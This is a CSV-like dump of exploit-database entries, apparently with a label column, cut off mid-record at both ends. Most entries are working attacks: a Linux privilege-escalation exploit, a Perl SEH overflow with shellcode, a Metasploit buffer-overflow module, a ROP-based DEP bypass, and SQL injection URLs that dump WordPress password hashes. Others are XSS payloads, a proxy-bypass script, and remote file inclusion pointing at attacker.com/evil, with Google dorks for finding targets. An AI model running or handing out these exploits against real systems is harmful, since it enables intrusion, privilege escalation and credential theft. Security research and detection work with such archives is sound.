PAYLOAD <img src=x onerror=alert(21)>  #################################################################################",OPNsense,1
25450,"Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalation /* userns_root_sploit.c by */ /* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */ /* You may use, modify, and redistribute this code under the GPLv2. */   #define _GNU_SOURCE #include <unistd.h> #include <sched.h> #include <sys/types.h> #include <sys/wait.h> #include <sys/mman.h> #include <fcntl.h> #include <stdio.h> #include <string.h> #include <err.h> #include <linux/futex.h> #include <errno.h> #include <unistd.h> #include <sys/syscall.h>   #ifndef CLONE_NEWUSER #define CLONE_NEWUSER 0x10000000 #endif   pid_t parent; int *ftx;   int childfn() {   int fd;   char buf[128];     if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &&       errno != EWOULDBLOCK)     err(1, ""futex"");     sprintf(buf, ""/proc/%ld/uid_map"", (long)parent);   fd = open(buf, O_RDWR | O_CLOEXEC);   if (fd == -1)     err(1, ""open %s"", buf);   if (dup2(fd, 1) != 1)     err(1, ""dup2"");     // Write something like ""0 0 1"" to stdout with elevated capabilities.   execl(""./zerozeroone"", ""./zerozeroone"");     return 0; }   int main(int argc, char **argv) {   int dummy, status;   pid_t child;     if (argc < 2) {     printf(""usage: userns_root_sploit COMMAND ARGS...\n\n""            ""This will run a command as (global) uid 0 but no capabilities.\n"");     return 1;   }     ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,              MAP_SHARED | MAP_ANONYMOUS, -1, 0);   if (ftx == MAP_FAILED)     err(1, ""mmap"");     parent = getpid();     if (signal(SIGCHLD, SIG_DFL) != 0)     err(1, ""signal"");     child = fork();   if (child == -1)     err(1, ""fork"");   if (child == 0)     return childfn();     *ftx = 1;   if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)     err(1, ""futex"");     if (unshare(CLONE_NEWUSER) != 0)     err(1, ""unshare(CLONE_NEWUSER)"");     if (wait(&status) != child)     err(1, ""wait"");   if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)     errx(1, ""child failed"");     if (setresuid(0, 0, 0) != 0)     err(1, ""setresuid"");   execvp(argv[1], argv+1);   err(1, argv[1]);     return 0; }",Linux Kernel,1
33310,"VMware Server 2.0.1 / ESXi Server 3.5 - Directory Traversal source: https://www.securityfocus.com/bid/36842/info  VMware products are prone to a directory-traversal vulnerability because they fail to sufficiently sanitize user-supplied input data.  Exploiting the issue may allow an attacker to obtain sensitive information from the host operating system that could aid in further attacks.  description = [[ Checks for a path-traversal vulnerability in VMWare ESX, ESXi, and Server (CVE-2009-3733), originally released by Justin Morehouse (justin.morehouse[at)gmail.com) and Tony Flick (tony.flick(at]fyrmassociates.com), and presented at Shmoocon 2010 (http://fyrmassociates.com/tools.html). ]]  --- -- @usage -- nmap --script http-vmware-path-vuln -p80,443,8222,8333 <host> -- -- @output --| http-vmware-path-vuln:   --|   VMWare path traversal (CVE-2009-3733): VULNERABLE --|     /vmware/Windows 2003/Windows 2003.vmx --|     /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx --|     /vmware/Pentest/Pentest - Windows/Windows 2003.vmx --|     /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx --|     /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx --|     /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx --|_    /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx -----------------------------------------------------------------------  author = ""Ron Bowes"" license = ""Same as Nmap--See http://www.exampel.com/book/man-legal.html"" categories = {""vuln"", ""safe"", ""default""}  require ""http"" require ""shortport""  portrule = shortport.port_or_service({80, 443, 8222,8333}, {""http"", ""https""})  local function get_file(host, port, path) 	local file  	-- Replace spaces in the path with %20 	path = string.gsub(path, "" "", ""%%20"")  	-- Try both ../ and %2E%2E/ 	file = ""/sdk/../../../../../../"" .. path  	local result = http.get( host, port, file) 	if(result['status'] ~= 200 or result['content-length'] == 0) then 		file = ""/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/"" .. path 		result = http.get( host, port, file)  		if(result['status'] ~= 200 or result['content-length'] == 0) then 			return false, ""Couldn't download file: "" .. path 		end 	end  	return true, result.body, file end  local function fake_xml_parse(str, tag) 	local result = {} 	local index, tag_start, tag_end  	-- Lowercase the 'body' we're searching 	local lc = string.lower(str) 	-- Lowrcase the tag 	tag = string.lower(tag)  	-- This loop does some ugly pattern-based xml parsing 	index, tag_start = string.find(lc, ""<"" .. tag .. "">"") 	while index do 		tag_end, index = string.find(lc, ""</"" .. tag .. "">"", index) 		table.insert(result, string.sub(str, tag_start + 1, tag_end - 1)) -- note: not lowercase 		index, tag_start = string.find(lc, ""<"" .. tag .. "">"", index) 	end  	return result end  --local function parse_vmware_conf(str, field) --	local index, value_start = string.find(str, field .. ""[^\""]*"") --	if(not(index) or not(value_start)) then --		return nil --	end -- --	local value_end = string.find(str, ""\"""", value_start + 1) --	if(not(value_end)) then --		return nil --	end -- --	return string.sub(str, value_start + 1, value_end - 1) --end  local function go(host, port) 	local result, body 	local files  	-- Try to download the file 	result, body = get_file(host, port, ""/etc/vmware/hostd/vmInventory.xml""); 	-- It failed -- probably not vulnerable 	if(not(result)) then 		return false, ""Couldn't download file: "" .. body 	end  	-- Check if the file contains the proper XML 	if(string.find(string.lower(body), ""configroot"") == nil) then 		return false, ""Server didn't return XML -- likely not vulnerable."" 	end  	files = fake_xml_parse(body, ""vmxcfgpath"")  	if(#files == 0) then 		return true, {""No VMs appear to be installed""} 	end  	-- Process each of the .vmx files if verbosity is on --	if(nmap.verbosity() > 1) then --		local result, file = get_file(host, port, files[1]) --io.write(nsedebug.tostr(file)) --	end  	return true, files end  action = function(host, port) 	-- Try a standard ../ path 	local status, result = go(host, port)  	if(not(status)) then 		return nil 	end  	local response = {} 	table.insert(response, ""VMWare path traversal (CVE-2009-3733): VULNERABLE"")  	if(nmap.verbosity() > 1) then 		table.insert(response, result) 	end  	return stdnse.format_output(true, response) end",VMWare ESX ESXi and Server,1
9064,"AudioPLUS 2.00.215 - '.lst' / '.m3u' Local Buffer Overflow (SEH) #!/usr/bin/perl # by hack4love # hack4love@hotmail.com # AudioPLUS 2.00.215 (.m3u / .lst File) Local buffer Overflow (seh) # # Greetz to all my friends # form egypt ## easy :d ## Tested on: Windows XP Pro SP2 (EN) ################################################################ my $bof=""\x41"" x 4116; my $nsh=""\xEB\x06\x90\x90""; my $seh=""\xb8\x15\xd1\x72""; my $nop=""\x90"" x 20; my $sec= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"". ""\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"". ""\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x38"". ""\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"". ""\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"". ""\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44"". ""\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"". ""\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33"". ""\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x37"". ""\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"". ""\x42\x50\x42\x50\x42\x50\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x53"". ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"". ""\x42\x35\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x36\x4a\x59"". ""\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"". ""\x4e\x56\x43\x46\x42\x30\x5a""; ################################################################### open(myfile,'>> hack4love.m3u'); print myfile $bof.$nsh.$seh.$nop.$sec; ###################################################################  # milw0rm.com [2009-07-01]",AudioPLUS,1
5135,"WordPress Plugin Photo album - SQL Injection ############################################################### # # WordPress album PHOTO SQL Injection # ############################################################### # # AUTHOR : S@BUN # # HOME 1 : http://www.milw0rm.com/author/1334 # # MAÄ°L : hackturkiye.hackturkiye@gmail.com # ################################################################ # # DORK 1 : allinurl: page_id album ""photo"" # ################################################################ EXAMPLE http://xxxxxxxx/?page_id=13&album= [exploit] EXPLOÄ°T  S@BUN&photo=-333333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/from%2F%2A%2A%2Fwp_users/**WHERE%20admin%201=%201  ################################################################ # S@BUN           i AM NOT HACKER            S@BUN ################################################################  # milw0rm.com [2008-02-16]",WordPress Plugin Photo album,1
35722,"Sefrengo CMS 1.6.0 - SQL Injection Advisory: SQL-Injection in administrative Backend of Sefrengo CMS v.1.6.0 Advisory ID: SROEADV-2015-04 Author: Steffen Rösemann Affected Software: CMS Sefrengo v.1.6.0 (Release-Date: 18th-Feb-2014) Vendor URL: http://www.sefrengo.org/start/start.html Vendor Status: fixed CVE-ID: -  ========================== Vulnerability Description: ==========================  The Content Management System Sefrengo v.1.6.0 contains SQL-Injection vulnerabilities in its administrative Backend.  ================== Technical Details: ==================  The administrative Backend of Sefrengo CMS contains a functionality to edit folders which reside on the CMS. Its located here:  http://{TARGET}/backend/main.php?area=con_configcat&idcat=1&idtplconf=0  The parameter „idcat“ ist vulnerable against SQL-Injection. An attacker could abuse this to send crafted URLs to the administrator via mail to execute own SQL commands (e.g. create a second admin-account).  Exploit-Example:  http:// {TARGET}/backend/main.php?area=con_configcat&idcat=1'+and+'1'='2'+union+select+version(),user(),3,4+--+&idtplconf=0  Another SQL-Injection vulnerability can be found in the administrative backend, where the admin can manage installed plugins. The vulnerable parameter is „idclient“ in the following URL:  http://{TARGET}/backend/main.php?area=plug&idclient=1  Exploit-Example:  http:// {TARGET}/backend/main.php?area=plug&idclient=1%27+and+%271%27=%272%27+union+select+1,version%28%29,user%28%29,4,database%28%29,6,7,8,9,10,11,12,13,14+--+  ========= Solution: =========  Update to the latest version  ==================== Disclosure Timeline: ==================== 21-Dec-2014 –found the vulnerability 21-Dec-2014 - informed the developers 22-Dec-2014 - response by vendor 04-Jan-2015 – fix by vendor 04-Jan-2015 - release date of this security advisory 04-Jan-2015 - post on BugTraq / FullDisclosure  ======== Credits: ========  Vulnerability found and advisory written by Steffen Rösemann.  =========== References: ===========  http://www.sefrengo.org/start/start.html http://sroesemann.blogspot.de",Sefrengo CMS,1
28906,"Simplog 0.9.3 - 'BlogID' Multiple SQL Injections source: https://www.securityfocus.com/bid/20899/info  Simplog is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  These issues affect version 0.9.3; other versions may also be vulnerable.  http://www.example.com/simplog/archive.php?blogid= http://www.example.com/simplog/archive.php?blogid=1&pid= http://www.example.com/simplog/index.php?blogid=",Simplog,1
16419,"Mercury/32 < 4.01b - PH Server Module Buffer Overflow (Metasploit) ## # $Id: mercury_phonebook.rb 9525 2010-06-15 07:18:08Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Mercury/32 <= v4.01b PH Server Module Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow in 				Mercury/32 <= v4.01b PH Server Module. This issue is 				due to a failure of the application to properly bounds check 				user-supplied data prior to copying it to a fixed size memory buffer. 			}, 			'Author'         => 'MC', 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9525 $', 			'References'     => 				[ 					[ 'CVE', '2005-4411' ], 					[ 'OSVDB', '22103'], 					[ 'BID', '16396' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Payload'        => 				{ 					'Space'    => 500, 					'BadChars' => ""\x00\x20\x0a\x0d"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ], 					[ 'Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4 } ], 				], 			'Privileged'     => true, 			'DisclosureDate' => 'Dec 19 2005', 			'DefaultTarget' => 0))  		register_options([ Opt::RPORT(105)], self) 	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		sploit =  rand_text_alphanumeric(224, payload_badchars) 		sploit << payload.encoded + ""\xeb\x06"" + make_nops(2) 		sploit << [target.ret].pack('V') + [0xe8, -450].pack('CV') + ""\r\n""  		sock.put(sploit)  		handler 		disconnect 	end  end",Mercury/32,1
3381,"NetProxy 4.03 - Web Filter Evasion / Bypass Logging #!/usr/bin/perl ########################################################################### # # Application:  # #	 NetProxy 4.03 #	 http://www.grok.co.uk/netproxy/index.html # # Description: # #	 NetProxy includes a powerful web cache to boost  #	 performance and reduce online costs. There is  #	 also an application-level firewall to protect your  #	 network from unwanted access, full access logging  #	 to allow you to track Internet usage, and  #	 password-protected access to various Internet resources. # # Vulnerability: # #	 Sending a specially crafted request to the proxy server  #	 allows users to view restricted Web content and bypass #	 the logging feature. # # Exploit: # #	 Assume that access to http://www.milw0rm.com has been blocked.  #	 The standard query string sent to NetProxy looks like: # #			GET http://www.milw0rm.com HTTP/1.0 # #	 NetProxy recognizes that this is a blocked URL and subsequently  #	 blocks the request. However, sending a request without 'http://'  #	 in the URL allows access to the blocked URL (note that the port  #	 must be manually specified as well): # #			GET www.milw0rm.com:80 HTTP/1.0 # #	 In addition, requests made in this manner are not logged to  # 	 NetProxy's connection log file.  # # Work-Around/Fix: # #	 Since the application automatically prepends the 'http://' string #	 to every URL specified in the block list, this technique should work  #	 for all restricted Web sites, and ensures that there is no easy fix  #	 for this security hole. POC code follows. # # Credit: # #	 Exploit discovered and coded by Craig Heffner #	 http://www.craigheffner.com #	 heffnercj [at] gmail.com ###########################################################################  use IO::Socket;  #Define the NetProxy server and port $proxy_ip = ""127.0.0.1""; $proxy_port = ""8080"";  #Set the site, port and page to request $site = ""www.milw0rm.com""; $port = ""80""; $page = ""index.html"";  #Define FF and IE user agent strings $ms_ie = ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)""; $ms_ff = ""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1"";  #Create connection to NetProxy my $sock = new IO::Socket::INET( 			Proto => 'tcp', 			PeerAddr => $proxy_ip, 			PeerPort => $proxy_port, 			); die ""Failed to connect to [$proxy_ip:$proxy_port] : $!\n"" unless $sock;	  #Format the request $request = ""GET $site:$port/$page HTTP/1.0\r\n""; $request .= ""User-Agent: $ms_ff\r\n""; $request .= ""\r\n"";  #Send the request print $sock $request;  #Read the reply while(<$sock>){ 	$reply .= $_; }  close($sock);  #Separate NetProxy header from HTML ($header,$html) = split(""\r\n\r"",$reply);  print $html;  exit;  # milw0rm.com [2007-02-27]",NetProxy,1
34683,e-soft24 Article Directory Script - 'q' Cross-Site Scripting source: https://www.securityfocus.com/bid/43343/info  e-soft24 Article Directory Script is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  e-soft24 Article Directory Script 2.5 is vulnerable; other versions may also be affected.   http://www.example.com/scripts/articledirectory-seo/index.php?q=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&page=search,e-soft24 Article Directory Script,0
26757,"Thwboard Beta 2.8 - 'misc.php?userid' SQL Injection source: https://www.securityfocus.com/bid/15763/info    ThWboard is prone to multiple input validation vulnerabilities.    The application is vulnerable to HTML injection, cross-site scripting, and SQL injection; these issues are due to a lack of proper sanitization of user-supplied input.    A remote attacker may inject SQL, HTML and script code resulting in theft of cookie-based authentication credentials, arbitrary script code execution, and the passing of malicious input to the underlying database application.    Version 3 beta 2.8 is vulnerable; other versions may be affected.   http://www.example.com/thwb/misc.php?action=getlastpost&userid='[SQL]",Thwboard,1
5545,"Kmita Mail 3.0 - 'file' Remote File Inclusion ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \    |    __)_ /    \  \//    ~    \/   |   \   |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                                           .OR.ID ECHO_ADV_94$2008  ----------------------------------------------------------------------------------------- [ECHO_ADV_94$2008]   Kmita Mail <= 3.0 (file) Remote File Inclusion Vulnerability -----------------------------------------------------------------------------------------  Author         : M.Hasran Addahroni Date           : May, 5 th 2008 Location       : Jakarta, Indonesia Web            : http://advisories.echo.or.id/adv/adv94-K-159-2008.txt Critical Lvl   : High Impact	       : System access Where	       : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application   : Kmita Mail version       : <= 3.0 Vendor        : http://www.kmitascripts.com/kmitamhome/ Description   :  Easy, fastest and Secure form processor. Installs directly from the server pre configured to your server. No programming hassles, no opening code files. Kmita Mail v.3 has inbuilt 3 levels of spam protection and has features like security image (CAPTCHA). The script works in backend, so you have full control over your web design. Supports most basic contact forms, feedback forms, order forms and other feature which you may like to use : Multiple visitor file UPLOADS, Auto responder with attachment, Success Page, Error Page, Validation ,To CC BCC email addresses. Kmita Mail has its own ADMIN utility and handles UNLIMITED FORMS with one installation. Best for novices and experts who want to SAVE precious TIME ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~  Input passed to the ""file"" parameter in htmlcode.php is not properly verified before being used to include files.  This can be exploited to include arbitrary files from local or external resources. Successful exploitation requires that ""register_globals"" is enabled.   Poc/Exploit: ~~~~~~~~~  http://www.target.com/kmitaadmin/kmitam/htmlcode.php?file=http://attacker.com/evil?  Note: sometimes need to login first.the default user & password are admin  Dork: ~~~~ Google    : ""inurl:/kmitam/""    Solution: ~~~~~~  - Edit the source code to ensure that input is properly verified. - Turn off register_globals in php.ini    Timeline: ~~~~~~~~  - 02 - 05 - 2008 bug found - 05 - 05 - 2008 vendor contacted - 05 - 05 - 2008 advisory released ---------------------------------------------------------------------------  Shoutz: ~~~~ ~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke ~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES ~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b ~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c ~ newbie_hacker@yahoogroups.com ~ #aikmel #e-c-h-o @irc.dal.net ~ special for rgod - good bye mate, thanks for the great works. --------------------------------------------------------------------------- Contact: ~~~~~       K-159 || echo|staff || eufrato[at]gmail[dot]com      Homepage: http://k-159.echo.or.id/  -------------------------------- [ EOF ] ----------------------------------  # milw0rm.com [2008-05-05]",Kmita Mail,1
2174,"Wheatblog 1.1 - 'session.php' Remote File Inclusion ########################################################################################### #                                   Aria-Security.net Advisory                            # #                                 Discovered  by: O.U.T.L.A.W                             # #                                < www.Aria-security.net >                                # #                      Gr33t to: A.u.r.a  & l2odon & DrtRp & Sh3ll                        #               ###########################################################################################   <?php include_once(""$wb_class_dir/classDatabase.php"");   function Start_Session() {     global $session_dir;      if ( $session_dir != '' )         session_save_path($session_dir);      if ( ! isset($_SESSION) )     {         session_start();         // Supposedly a fix for IE6         header('Cache-control: private');         My_Cache();          if ( ! isset($_SESSION['db']) || gettype($_SESSION['db']->db) != 'resource')             touchDatabaseSession();      } }   ***********************************************************************  Proof of Concept: server/includes/session.php?wb_class_dir=SHELL  Contact : Outlaw@aria-security.net  # milw0rm.com [2006-08-11]",Wheatblog,1
46204,"Microsoft Edge Chakra - 'InitClass' Type Confusion /*  Issue description  This is similar to  issue 1702 (https://www.exploit-db.com/exploits/46203) . This time, it uses an InitClass instruction to reach the SetIsPrototype method.  PoC: */  function opt(o, c, value) {     o.b = 1;      class A extends c {      }      o.a = value; }  function main() {     for (let i = 0; i < 2000; i++) {         let o = {a: 1, b: 2};         opt(o, (function () {}), {});     }      let o = {a: 1, b: 2};     let cons = function () {};      cons.prototype = o;      opt(o, cons, 0x1234);      print(o.a); }  main();",Microsoft Edge Chakra,1
5202,"Barryvan Compo Manager 0.3 - Remote File Inclusion --==+================================================================================+==-- --==+		barryvancompo-0.3 Remote File Inclusion                              +==-- --==+================================================================================+==--   Author: MhZ91  Title: barryvancompo-0.3 Remote File Inclusion   Download: http://sourceforge.net/projects/barryvancompo/  Bug: Remote File Inclusion  Info: The barryvan compo manager is a PHP, Smarty and MySQL-based system for running, organising, and maintaining competitions. It is particularly designed for use within the computer music ""scene"".  Visit: http://www.inj3ct-it.org  [*]----------------------------------------------------------  barryvancompo-0.3 present a variable ""pageURL"" not definited in this file   main.php (and all files require it)  we can exploit it by the variable ""pageURL"", for example  http://www.example.com/main.php?pageURL=[Evil_Code]   [*]----------------------------------------------------------  # milw0rm.com [2008-02-28]",Barryvan Compo Manager,1
34632,"Multi Website 1.5 - 'search' HTML Injection source: https://www.securityfocus.com/bid/43245/info  Multi Website is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.  Multi Website 1.5 is vulnerable; other versions may also be affected.  http://www.example.com/demo/?action=search&search=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&gateway=%E4%E3%D8+%C7%E1%C8%CD%CB&by=words",Multi Website,1
38829,"Easy File Sharing Web Server 7.2 - Remote Buffer Overflow (SEH) (DEP Bypass + ROP) #!/usr/bin/env python # # Exploit title: Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP) # Date: 29/11/2015 # Exploit Author: Knaps # Contact: @TheKnapsy # Website: http://blog.knapsy.com # Software Link: http://www.sharing-file.com/efssetup.exe # Version: Easy File Sharing Web Server v7.2 # Tested on: Windows 7 x64, but should work on any other Windows platform # # Notes: # - based on non-DEP SEH buffer overflow exploit by Audit0r (https://www.exploit-db.com/exploits/38526/) # - created for fun & practice, also because it's not 1998 anymore - gotta bypass that DEP! :) # - bad chars: '\x00' and '\x3b' # - max shellcode size allowed: 1260 bytes #  import sys, socket, struct  # ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy) # Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP. def create_rop_chain():      rop_gadgets = [ 	  # Generate value of 201 in EAX 	  0x10015442,  # POP EAX # RETN [ImageLoad.dll] 	  0xFFFFFDFF,  # Value of '-201' 	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll] 	 	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...) 	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 	   	  # Carry on with the ROP as generated by mona.py 	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]        0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll] 	 	  # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location 	  # used solely by the remaining part of the above gadget (it doesn't really do anything for us) 	  0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll] 	  0x61c73281,  # &Writable location [sqlite3.dll] 	 	  # And carry on further as generated by mona.py 	  0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]        0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]       0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll]        0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll]        0x10013ad6,  # POP EBP # RETN [ImageLoad.dll]        0x61c227fa,  # & push esp # ret  [sqlite3.dll]       0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]  	   	  # Now bunch of ugly increments... unfortunately couldn't find anything nicer :(       0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC 